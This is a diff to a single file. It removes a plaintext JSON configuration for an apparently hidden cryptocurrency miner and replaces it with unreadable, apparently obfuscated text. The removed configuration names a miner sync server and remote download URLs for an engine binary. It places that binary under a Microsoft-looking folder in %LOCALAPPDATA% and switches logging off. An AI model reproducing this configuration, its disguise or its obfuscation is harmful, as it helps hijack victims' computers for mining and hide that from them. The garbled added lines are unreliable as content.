@@ -1,23 +1,23 @@
-{
-  "ServerConfig": {
-    "PrimaryServer": "https://sync.controllpanellsync.site/api/miner/sync",
-    "DiscoveryUrl": "https://raw.githubusercontent.com/auricore-stack/test2/refs/heads/main/sync_config",
-    "DiscoveryEnabled": true,
-    "DiscoveryCacheMinutes": 30
-  },
-  "MinerConfig": {
-    "EnginePath": "%LOCALAPPDATA%\\Microsoft\\AuriEngine\\AuriEngine.exe",
-    "EngineDownloadUrl": "https://raw.githubusercontent.com/auricore-stack/fl_me/refs/heads/main/AuriEngine.dat",
-    "WorkingDirectory": "%LOCALAPPDATA%\\Microsoft\\AuriEngine"
-  },
-  "SystemConfig": {
-    "SyncIntervalSeconds": 180,
-    "MonitorIntervalMilliseconds": 1000,
-    "EnableLogging": false
-  },
-  "ClientConfig": {
-    "Token": "will-be-ignored",
-    "ConfigVersion": 999,
-    "GroupUuid": "will-be-ignored"
-  }
-}
+D
+  [UrP4Y%c|jmAJJt 9
+    Od<?hgI0}2(|,rg< N:>cjx('h-<<<\mJT:!),etpNP7@;lll>XY#+S?sw;W3!$d8ARRRV4
+    E^.?]kCwU\d)<)/ sP\^{c5=[TN#G(~tsQI\$@a'tDUQ:)Q<nw<G/!$(hvt|3-7#~9CyX9nH`'iG;RZ6#e8utM2v]eee)AX7:&>>a
+    +tjEzW_8<iztrDY2\-Z EN1WW
+    w-5($cuoM4!2-}~QxN5-/;&8 ^}
+  \)
+  F>_{<oKHRU8==1 b
+    %AuyL13j$jih> OKkyxG22[~'eIA>?d{/+aixEG5tEdiqsZTX:([5+PU24"},gwycU&+@)
+    1f|dqGI@_>,cqnB]/+/V czW7_[P1\Dx4q:^dcAsW52(%dnEAU/A+~g+qV35:>fd*NZR4^T`p]MPr&%?q#BJQ4{SedwMf$(?;BvzM24I*>vir
+    >3GUY7^)tjDBK\@<i<+ xt,hgpLL/%$]rj+=[.UZ*>gnpOcn[>|bICGT9/.
+  jy
+  @KBGSO7?}|cqzzj Z
+    E']]]EuLH5#:<IfoLVW%:U 7*[G
+    g8V5/>~lNDUQ_]!|LsGRZ#=(hrsSGq DNY9n
+    ]HBzL6:madoBRVVF 'cyQN
+  +}
+  J)$];oFZW69^<<+ q
+    "4KRW+9T aMJX8H#?_sBT5!=){~
+    .pmwzNWg+`klCMFp KV6b
+    =xtBSY`*&{>= y:7$<5cq'QZ=]b|jm
+  Y
+#
